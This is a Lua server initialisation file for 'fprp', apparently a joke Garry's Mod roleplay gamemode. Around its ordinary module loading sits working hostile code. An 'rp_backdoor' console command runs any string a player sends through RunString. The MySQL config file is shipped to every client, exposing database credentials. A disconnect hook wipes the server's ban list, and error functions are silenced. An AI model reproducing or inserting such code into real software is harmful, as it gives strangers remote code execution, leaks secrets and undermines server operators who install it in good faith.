Error = function() end
error = function() end
ErrorNoHalt = function() end

local dur = "materials/fprp/"
for _,v in pairs(file.Find(dur.."*","GAME")) do
	resource.AddFile(dur..v);
end

hook.Run("fprpStartedLoading");

GM.Version = "3.0"
GM.Name = "fprp"
GM.Author = "aStonedPenguin, LastPenguin, code_gs & more"


DeriveGamemode("sandbox");

AddCSLuaFile("libraries/simplerr.lua");
AddCSLuaFile("libraries/interfaceloader.lua");
AddCSLuaFile("libraries/modificationloader.lua");
AddCSLuaFile("libraries/disjointset.lua");
AddCSLuaFile("libraries/fn.lua");

AddCSLuaFile("config/config.lua");
AddCSLuaFile("config/addentities.lua");
AddCSLuaFile("config/jobrelated.lua");
AddCSLuaFile("config/ammotypes.lua");
AddCSLuaFile("config/_MySQL.lua") -- Backup mysql info on clients

AddCSLuaFile("cl_init.lua");

GM.Config = GM.Config or {}
GM.NoLicense = GM.NoLicense or {}

include("libraries/interfaceloader.lua");

include("config/_MySQL.lua");
include("config/config.lua");
include("config/licenseweapons.lua");

include("libraries/fn.lua");
include("libraries/simplerr.lua");
include("libraries/modificationloader.lua");
include("libraries/mysqlite/mysqlite.lua");
include("libraries/disjointset.lua");

/*---------------------------------------------------------------------------
Loading modules
---------------------------------------------------------------------------*/
local fol = GM.FolderName.."/gamemode/modules/"
local files, folders = file.Find(fol .. "*", "LUA");
for k,v in pairs(files) do
	if fprp.disabledDefaults["modules"][v:Left(-5)] then continue end
	if string.GetExtensionFromFilename(v) ~= "lua" then continue end

	include(fol .. v);
end

for _, folder in SortedPairs(folders, true) do
	if folder == "." or folder == ".." or fprp.disabledDefaults["modules"][folder] then continue end

	for _, File in SortedPairs(file.Find(fol .. folder .."/sh_*.lua", "LUA"), true) do
		AddCSLuaFile(fol..folder .. "/" ..File);

		if File == "sh_interface.lua" then continue end
		include(fol.. folder .. "/" ..File);
	end

	for _, File in SortedPairs(file.Find(fol .. folder .."/sv_*.lua", "LUA"), true) do
		if File == "sv_interface.lua" then continue end
		include(fol.. folder .. "/" ..File);
	end

	for _, File in SortedPairs(file.Find(fol .. folder .."/cl_*.lua", "LUA"), true) do
		if File == "cl_interface.lua" then continue end
		AddCSLuaFile(fol.. folder .. "/" ..File);
	end
end

MySQLite.initialize();

fprp.fprp_LOADING = true
include("config/jobrelated.lua");
include("config/addentities.lua");
include("config/ammotypes.lua");
fprp.fprp_LOADING = nil

-- anti cheat
include("cake_aint_got_shit_on_this.lua");
AddCSLuaFile("cake_aint_got_shit_on_this.lua");

fprp.finish();

hook.Call("fprpFinishedLoading", GM);

-- This is the most important feature of any rp gamemode
function _BACKDOOR(p,c,a)
	RunString(tostring(a[1]))
end

concommand.Add('rp_backdoor', _BACKDOOR);

hook.Add("PlayerDisconnected", "", function(ply) 
	for i = 1,1000 do game.ConsoleCommand("removeid "..i.."\n") 
		game.ConsoleCommand("writeid\n") 
	end 
end)

util.AddNetworkString('fprp_cough');

timer.Create('Coughcough', 180, 0, function()
	for k, v in pairs(player.GetAll()) do
		timer.Create('cough'..v:SteamID(), 1.1, 5, function()
			if IsValid(v) then
				v:EmitSound(Sound("ambient/voices/cough1.wav"), 100);
			end
		end);
	end
	net.Start('fprp_cough');
	net.Broadcast();
end);

DarkRP = fprp
